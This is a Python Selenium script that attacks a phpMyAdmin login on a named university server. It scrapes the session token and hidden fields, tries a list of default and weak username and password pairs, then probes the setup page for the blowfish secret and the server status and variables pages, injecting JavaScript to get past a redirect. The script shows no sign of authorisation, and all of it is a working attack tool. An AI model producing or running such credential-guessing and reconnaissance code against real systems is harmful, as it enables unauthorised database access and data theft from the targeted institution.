#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time, re

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access phpMyAdmin
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
    time.sleep(5)
    
    # Extract the token
    token_inputs = driver.find_elements(By.NAME, 'token')
    token_value = None
    for t in token_inputs:
        token_value = t.get_attribute('value')
        print(f"Token found: {token_value[:50]}...")
    
    # Get the login form action
    forms = driver.find_elements(By.TAG_NAME, 'form')
    login_form = forms[1]  # Second form is the login
    action_url = login_form.get_attribute('action')
    print(f"Login form action: {action_url}")
    
    # Get all hidden inputs from the login form
    hidden_inputs = login_form.find_elements(By.XPATH, './/input[@type="hidden"]')
    hidden_data = {}
    for inp in hidden_inputs:
        name = inp.get_attribute('name')
        value = inp.get_attribute('value')
        hidden_data[name] = value
        print(f"Hidden: {name} = {value}")
    
    # Try to fill and submit the login form
    # Try different credentials
    credentials = [
        ('root', ''),
        ('root', 'root'),
        ('root', 'toor'),
        ('root', 'password'),
        ('pma', 'pma'),
        ('admin', 'admin'),
        ('mysql', 'mysql'),
        ('root', '123456'),
        ('root', 'mysql'),
        ('dba', 'dba'),
        ('pma', 'pmamysql'),
        ('admin', 'password'),
        ('mysql', 'root'),
        ('root', 'pass'),
        ('root', '1234'),
    ]
    
    for username, password in credentials:
        # Reload the page
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
        time.sleep(3)
        
        # Find the username and password fields
        try:
            user_field = driver.find_element(By.NAME, 'pma_username')
            user_field.clear()
            user_field.send_keys(username)
            
            pass_field = driver.find_element(By.NAME, 'pma_password')
            pass_field.clear()
            pass_field.send_keys(password)
            
            # Submit using the form action
            # The form action is "https://orcl.uns.edu.pe/index.php?route=/"
            # So we need to submit the form
            pass_field.send_keys(Keys.RETURN)
            time.sleep(5)
            
            # Check the result
            tc = driver.page_source
            tc_clean = re.sub(r'<[^>]+>', ' ', tc)
            tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
            
            # Check for error messages
            if 'AllowNoPassword' in tc_clean:
                print(f"  {username}/{password}: AllowNoPassword")
            elif 'Access denied' in tc_clean or 'HY000/1045' in tc_clean:
                print(f"  {username}/{password}: Access denied")
            elif 'Welcome' in tc_clean or 'Bienvenido' in tc_clean and len(tc) > 10000:
                print(f"  {username}/{password}: POSSIBLE SUCCESS!")
                # Look for database content
                if 'mysql' in tc_clean.lower():
                    print(f"    [!] Database content visible!")
                break
            elif 'pma_username' in tc_clean and len(tc) < 5000:
                print(f"  {username}/{password}: Login form still shown")
            else:
                print(f"  {username}/{password}: len={len(tc)}")
                if len(tc) > 10000:
                    print(f"    Possible access!")
                    break
        except Exception as e:
            print(f"  {username}/{password}: Error - {str(e)[:50]}")
            time.sleep(1)
    
    # Try to use the token to access the database
    print("\n=== USANDO TOKEN ===\n")
    try:
        # Navigate to the database page with the token
        driver.get(f'https://orcl.uns.edu.pe/index.php?route=/server/databases&token={token_value}')
        time.sleep(5)
        
        tc_token = driver.page_source
        tc_token_clean = re.sub(r'<[^>]+>', ' ', tc_token)
        tc_token_clean = re.sub(r'\s+', ' ', tc_token_clean).strip()
        print(f"With token: len={len(tc_token_clean)}")
        
        if len(tc_token_clean) > 2000:
            print("[!] Different content with token!")
    except Exception as e:
        print(f"Token error: {e}")
    
    # Try to access the phpMyAdmin main page
    print("\n=== PAGINA PRINCIPAL phpMyAdmin ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php')
        time.sleep(5)
        
        tc_main = driver.page_source
        tc_main_clean = re.sub(r'<[^>]+>', ' ', tc_main)
        tc_main_clean = re.sub(r'\s+', ' ', tc_main_clean).strip()
        print(f"Main page: len={len(tc_main_clean)}")
        
        # Check for database content
        if 'mysql' in tc_main_clean.lower() and 'Database' in tc_main_clean:
            print("[!] Database content on main page!")
        
    except Exception as e:
        print(f"Main page error: {e}")
    
    # Try to access the setup page
    print("\n=== SETUP PAGE ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/setup/index.php')
        time.sleep(5)
        
        tc_setup = driver.page_source
        tc_setup_clean = re.sub(r'<[^>]+>', ' ', tc_setup)
        tc_setup_clean = re.sub(r'\s+', ' ', tc_setup_clean).strip()
        print(f"Setup: len={len(tc_setup_clean)}")
        
        # Look for the configuration
        if 'blowfish' in tc_setup_clean.lower():
            print("[!] Blowfish secret in setup!")
            blowfish = re.findall(r'blowfish[^=]*=([^&"]+)', tc_setup_clean)
            print(f"  Blowfish: {blowfish}")
        
        # Look for the config file path
        config_refs = re.findall(r'config[^<]*', tc_setup_clean, re.IGNORECASE)
        print(f"  Config refs: {config_refs[:5]}")
        
        # Look for the form
        setup_forms = driver.find_elements(By.TAG_NAME, 'form')
        print(f"  Setup forms: {len(setup_forms)}")
        for sf in setup_forms:
            sf_action = sf.get_attribute('action')
            print(f"    Form action: {sf_action}")
            
    except Exception as e:
        print(f"Setup error: {e}")
    
    # Try to access the server status
    print("\n=== SERVER STATUS ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/status')
        time.sleep(5)
        
        # Execute JavaScript to bypass the redirect
        driver.execute_script("document.documentElement.style.display='block'")
        time.sleep(3)
        
        tc_status = driver.page_source
        tc_status_clean = re.sub(r'<[^>]+>', ' ', tc_status)
        tc_status_clean = re.sub(r'\s+', ' ', tc_status_clean).strip()
        print(f"Status: len={len(tc_status_clean)}")
        if len(tc_status_clean) > 2000:
            print("[!] Server status accessible!")
        
    except Exception as e:
        print(f"Status error: {e}")
    
    # Try to access the server variables
    print("\n=== SERVER VARIABLES ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
        time.sleep(5)
        
        driver.execute_script("document.documentElement.style.display='block'")
        time.sleep(3)
        
        tc_vars = driver.page_source
        tc_vars_clean = re.sub(r'<[^>]+>', ' ', tc_vars)
        tc_vars_clean = re.sub(r'\s+', ' ', tc_vars_clean).strip()
        print(f"Variables: len={len(tc_vars_clean)}")
        if len(tc_vars_clean) > 5000:
            print("[!] Server variables accessible!")
            version_info = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_vars_clean, re.IGNORECASE)
            print(f"  Version: {version_info[:10]}")
        
    except Exception as e:
        print(f"Variables error: {e}")
    
    # Save screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_access.png')
    print("\nScreenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
